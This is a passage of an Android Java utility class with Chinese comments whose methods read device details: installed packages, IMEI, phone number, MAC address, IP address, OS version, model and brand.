        List<PackageInfo> pinfo = packageManager.getInstalledPackages(0);
        for (int i = 0; i < pinfo.size(); i++) {
            if (pinfo.get(i).packageName.equalsIgnoreCase(packageName))
                return true;
        }
        return false;
    }


    /**
     * 获取设备id
     *
     * @return
     */

    @SuppressLint("MissingPermission")
    public String getDeviceId() {
        String deviceId = "";

        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            deviceId = tm.getDeviceId();
        } catch (Exception e) {
            Log.e("regus", " getDeviceId-> " + e.getLocalizedMessage());
        }

        return deviceId;

    }


    /**
     * 获取设备
     *
     * @return
     */

    @SuppressLint("MissingPermission")
    public String getPhoneNum() {
        String phone = "";

        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            phone = tm.getLine1Number();
        } catch (Exception e) {
            Log.e("regus", " getPhoneNum-> " + e.getLocalizedMessage());
        }

        return phone;

    }


    /**
     * 获取MAC地址
     *
     * @param context
     * @return
     */
    public static String getMacAddress(Context context) {
        String mac = "02:00:00:00:00:00";
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
            mac = getMacDefault(context);
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Build.VERSION.SDK_INT < Build.VERSION_CODES.N) {
            mac = getMacAddress();
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            mac = getMacFromHardware();
        }
        return mac;
    }


    /**
     * Android  6.0 之前（不包括6.0）
     * 必须的权限  <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
     *
     * @param context
     * @return
     */
    private static String getMacDefault(Context context) {
        String mac = "02:00:00:00:00:00";
        if (context == null) {
            return mac;
        }

        WifiManager wifi = (WifiManager) context.getApplicationContext()
                .getSystemService(Context.WIFI_SERVICE);
        if (wifi == null) {
            return mac;
        }
        WifiInfo info = null;
        try {
            info = wifi.getConnectionInfo();
        } catch (Exception e) {
        }
        if (info == null) {
            return null;
        }
        mac = info.getMacAddress();
        if (!TextUtils.isEmpty(mac)) {
            mac = mac.toUpperCase(Locale.ENGLISH);
        }
        return mac;
    }


    /**
     * Android 6.0（包括） - Android 7.0（不包括）
     *
     * @return
     */
    private static String getMacAddress() {
        String WifiAddress = "02:00:00:00:00:00";
        try {
            WifiAddress = new BufferedReader(new FileReader(new File("/sys/class/net/wlan0/address"))).readLine();
        } catch (IOException e) {
            e.printStackTrace();
            Log.e("regus", " getMacAddress-> " + e.getLocalizedMessage());
        }
        return WifiAddress;
    }


    /**
     * 7.0 以后
     * 遍历循环所有的网络接口，找到接口是 wlan0
     * 必须的权限 <uses-permission android:name="android.permission.INTERNET" />
     *
     * @return
     */
    private static String getMacFromHardware() {
        try {
            List<NetworkInterface> all = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface nif : all) {
                if (!nif.getName().equalsIgnoreCase("wlan0")) continue;

                byte[] macBytes = nif.getHardwareAddress();
                if (macBytes == null) {
                    return "";
                }

                StringBuilder res1 = new StringBuilder();
                for (byte b : macBytes) {
                    res1.append(String.format("%02X:", b));
                }

                if (res1.length() > 0) {
                    res1.deleteCharAt(res1.length() - 1);
                }
                return res1.toString();
            }
        } catch (Exception e) {
            Log.e("regus", " getMacFromHardware-> " + e.getLocalizedMessage());
            e.printStackTrace();
        }
        return "02:00:00:00:00:00";
    }


    /**
     * 获取ip地址
     *
     * @param context
     * @return
     */

    public static String getIPAddress(Context context) {
        NetworkInfo info = ((ConnectivityManager) context
                .getSystemService(Context.CONNECTIVITY_SERVICE)).getActiveNetworkInfo();
        if (info != null && info.isConnected()) {
            if (info.getType() == ConnectivityManager.TYPE_MOBILE) {    // 当前使用2G/3G/4G网络
                try {
                    for (Enumeration<NetworkInterface> en = NetworkInterface.getNetworkInterfaces(); en.hasMoreElements(); ) {
                        NetworkInterface intf = en.nextElement();
                        for (Enumeration<InetAddress> enumIpAddr = intf.getInetAddresses(); enumIpAddr.hasMoreElements(); ) {
                            InetAddress inetAddress = enumIpAddr.nextElement();
                            if (!inetAddress.isLoopbackAddress() && inetAddress instanceof Inet4Address) {
                                return inetAddress.getHostAddress();
                            }
                        }
                    }
                } catch (SocketException e) {
                    e.printStackTrace();
                    Log.e("regus", " getIPAddress-> " + e.getLocalizedMessage());
                }

            } else if (info.getType() == ConnectivityManager.TYPE_WIFI) {    // 当前使用无线网络
                WifiManager wifiManager = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
                WifiInfo wifiInfo = wifiManager.getConnectionInfo();
                String ipAddress = intIP2StringIP(wifiInfo.getIpAddress());    // 得到IPV4地址
                return ipAddress;
            }
        }
        return "";
    }

    /**
     * 将得到的int类型的IP转换为String类型
     *
     * @param ip
     * @return
     */
    public static String intIP2StringIP(int ip) {
        return (ip & 0xFF) + "." +
                ((ip >> 8) & 0xFF) + "." +
                ((ip >> 16) & 0xFF) + "." +
                (ip >> 24 & 0xFF);
    }


    /**
     * 获取当前手机系统版本号
     *
     * @return 系统版本号
     */
    public static String getSystemInfo() {

        String handSetInfo =
                " android " + Build.VERSION.RELEASE +
                        "  /  " + Build.MODEL;

        Log.e("regus", "手机信息 " + handSetInfo);

        return handSetInfo;
    }


    /**
     * 获取手机厂商
     *
     * @return 手机厂商
     */
    public static String getDeviceBrand() {
        return Build.BRAND;
    }


}
